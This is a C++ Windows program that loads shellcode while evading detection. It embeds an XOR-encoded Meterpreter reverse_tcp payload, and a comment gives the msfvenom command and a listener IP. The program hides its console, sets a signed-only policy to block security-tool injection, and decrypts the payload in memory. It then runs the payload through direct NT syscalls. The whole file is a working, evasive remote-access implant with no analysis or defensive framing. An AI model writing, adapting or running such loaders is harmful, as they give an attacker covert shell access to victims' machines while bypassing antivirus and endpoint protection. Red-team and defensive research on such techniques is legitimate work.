#include <iostream>
#include <windows.h>
#include "horses.h"

int main() {
	// prevent non-microsoft processes from injecting into the current process
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
	sp.MicrosoftSignedOnly = 1;
	SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	ULONG oldProt = 0x0;
	HANDLE hThread;
	LPVOID baseAddr = nullptr;
	HANDLE hProc = GetCurrentProcess();
	LARGE_INTEGER li;

	// XOR encoded: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.226.131 LPORT=443 -f c
	unsigned char boeffer[] = "\xae\x48\xd1\xe4\xa2\xe8\x9e\x0\x52\x0\x13\x51\x13\x50\x0\x51\x4\x48\x63\xd2\x37\x48\xd9\x52\x32\x48\xd9\x52\x4a\x48\xd9\x52\x72\x48\xd9\x72\x2\x4d\x63\xc9\x1a\xf\xe5\x4a\x18\x48\x63\xc0\xfe\x3c\x33\x7c\x50\x2c\x72\x41\x93\xc9\x5f\x41\x53\xc1\xb0\xed\x0\x48\xd9\x52\x72\x8b\x10\x3c\x1a\x1\x82\x41\x3\x66\xd3\x78\x4a\xb\x50\xf\xd7\x72\x52\x0\x52\x8b\xd2\x88\x52\x0\x52\x48\xd7\xc0\x26\x67\x1a\x1\x82\x8b\x1a\x18\x16\x8b\x12\x20\x1b\x1\x82\x50\xb1\x56\x1a\xff\x9b\x4d\x63\xc9\x13\x8b\x66\x88\x1a\x1\x84\x48\x63\xc0\x13\xc1\x9b\xd\xfe\x41\x53\xc1\x6a\xe0\x27\xf1\x1e\x3\x1e\x24\x5a\x45\x6b\xd1\x27\xd8\xa\x44\xd9\x40\x76\x49\x53\xd0\x34\x41\xd9\xc\x1a\x44\xd9\x40\x4e\x49\x53\xd0\x13\x8b\x56\x88\x13\x58\x13\x58\x1a\x1\x82\x5e\xb\x5a\x13\x58\x13\x59\x13\x5a\x1a\x83\xbe\x20\x13\x52\xad\xe0\xa\x41\xb\x5a\x1a\x8b\x40\xe9\x19\xff\xad\xff\xf\x49\xec\x77\x21\x32\xd\x33\x60\x0\x52\x41\x4\x49\xdb\xe6\x1a\x81\xbe\xa0\x53\x0\x52\x49\xdb\xe5\x1b\xbc\x50\x0\x53\xbb\x92\xa8\xb0\x83\x13\x54\x1b\x89\xb6\x4c\xdb\xf1\x13\xba\x1e\x77\x74\x7\xad\xd5\x1e\x89\xb8\x68\x53\x1\x52\x0\xb\x41\xe8\x29\xd2\x6b\x52\xff\x87\x6a\x58\x41\xc\x50\x2\x4d\x63\xc9\x1f\x31\x92\x48\xad\xc0\x1a\x89\x90\x48\xad\xc0\x1a\x89\x93\x41\xe8\xea\x5d\xdf\xb2\xff\x87\x48\xdb\xc7\x38\x10\x13\x58\x1e\x89\xb0\x48\xdb\xf9\x13\xba\xcb\xa5\x26\x61\xad\xd5\xd7\xc0\x26\xa\x1b\xff\x9c\x75\xb7\xe8\xc1\x0\x52\x0\x1a\x83\xbe\x10\x1a\x89\xb0\x4d\x63\xc9\x38\x4\x13\x58\x1a\x89\xab\x41\xe8\x2\x8b\xc8\xd\xff\x87\x83\xaa\x0\x2c\x55\x1a\x83\x96\x20\xc\x89\xa4\x6a\x12\x41\xb\x68\x52\x10\x52\x0\x13\x58\x1a\x89\xa0\x48\x63\xc9\x13\xba\xa\xa4\x1\xe5\xad\xd5\x1a\x89\x91\x49\xdb\xc7\x1f\x31\x9b\x49\xdb\xf0\x1a\x89\x88\x48\xdb\xf9\x13\xba\x50\xd9\x9a\x5f\xad\xd5\xd1\xf8\x52\x7d\x7a\x58\x13\x57\xb\x68\x52\x40\x52\x0\x13\x58\x38\x0\x8\x41\xe8\xb\x7d\xf\x62\xff\x87\x57\xb\x41\xe8\x75\x3c\x4d\x33\xff\x87\x49\xad\xce\xbb\x3c\xad\xff\xad\x48\x53\xc3\x1a\x29\x94\x48\xd7\xf6\x27\xb4\x13\xff\xb5\x58\x38\x0\xb\x49\x95\xc2\xa2\xb5\xf0\x56\xad\xd5";

	// XOR key
	const char schluessel[] = "R";

	SIZE_T boefLen = sizeof(boeffer);
	NtAllocateVirtualMemory(hProc, &baseAddr, 0, (PSIZE_T)&boefLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// write XOR'd shellcode in memory
	memcpy(baseAddr, boeffer, sizeof(boeffer));
	// decrypt XOR'd shellcode in memory
	eksor(schluessel, sizeof(schluessel), sizeof(boeffer), baseAddr);
	NtProtectVirtualMemory(hProc, &baseAddr, (PSIZE_T)&boefLen, PAGE_EXECUTE_READ, &oldProt);
	NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)baseAddr, NULL, FALSE, 0, 0, 0, NULL);

	li.QuadPart = INFINITE;
	NtWaitForSingleObject(hThread, FALSE, NULL);
	NtClose(hThread);
	NtFreeVirtualMemory(hProc, &baseAddr, 0, MEM_RELEASE | MEM_DECOMMIT);
	NtClose(hProc);
}

// not quite C++ style, but it works
void eksor(const char* key, int keyLen, int dataLen, LPVOID startAddr) {
	BYTE* t = (BYTE*)startAddr;
	for (DWORD i = 0; i < dataLen; i++) {
		t[i] ^= key[i % keyLen];
	}
}